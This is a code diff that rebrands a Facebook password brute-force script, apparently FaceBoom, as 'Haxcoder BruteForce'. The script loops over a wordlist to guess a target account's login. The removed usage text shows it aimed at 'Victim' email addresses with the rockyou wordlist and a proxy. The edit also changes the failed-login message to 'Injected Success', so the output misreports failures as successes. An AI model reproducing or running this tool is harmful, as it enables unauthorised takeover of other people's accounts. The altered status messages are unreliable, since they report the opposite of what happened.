@@ -106,9 +106,9 @@ class FaceBoom(object):
         proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
         print(gr+"""
 ==================================
-[---]        """+wi+"""FaceBoom"""+gr+"""        [---]
+[---]        """+wi+"""Haxcoder BruteForce"""+gr+"""        [---]
 ==================================
-[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
+[---]  """+wi+"""BruteForce """+gr+""" [---]
 ==================================
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
@@ -146,36 +146,17 @@ class FaceBoom(object):
                 write("  [+] Successfully updated :)\n")
 
 parse = optparse.OptionParser(wi+"""
-Usage: python ./faceboom.py [OPTIONS...]
+Usage: python ./haxcoder.py [OPTIONS...]
 -------------
 OPTIONS:
        |
     |--------
-    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
+    | -t <target email>     ::> Specify target Email [OR] Target Profile ID
     |--------
     | -w <wordlist Path>                      ::> Specify Wordlist File Path
     |--------
-    | -s <single password>                    ::> Specify Single Password To Check
-    |--------
-    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
-    |--------
-    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
-    |--------
-    | -u/--update                             ::> Update FaceBoom Script
--------------
-Examples:
-        |
-     |--------
-     | python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
-     |--------
-     | python faceboom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
-     |--------
-     | python faceboom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
-     |--------
-     | python faceboom.py -t Victim@gmail.com -s 1234567
-     |--------
-     | python faceboom.py -g https://www.facebook.com/Victim_Profile
-     |--------
+    | -u/--update                             ::> Update Haxcoder Script
+-----------------------------------------------------------------------------
 """)
 
 
@@ -240,7 +221,7 @@ def Main():
         for passwd in passwords:
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
-                write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
+                write(wi+"["+yl+str(loop)+wi+"] Injecting Data[ {"+yl+str(passwd)+wi+"} ]")
                 retCode = faceboom.login(target, passwd)
                 if retCode:
                     sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
@@ -250,7 +231,7 @@ def Main():
                     if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                     break
                 else:
-                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
+                    sys.stdout.write(yl+" ==> Injected"+rd+" Success\n")
                     loop = loop + 1 if not single_passwd else "~"
         else:
                 if single_passwd:
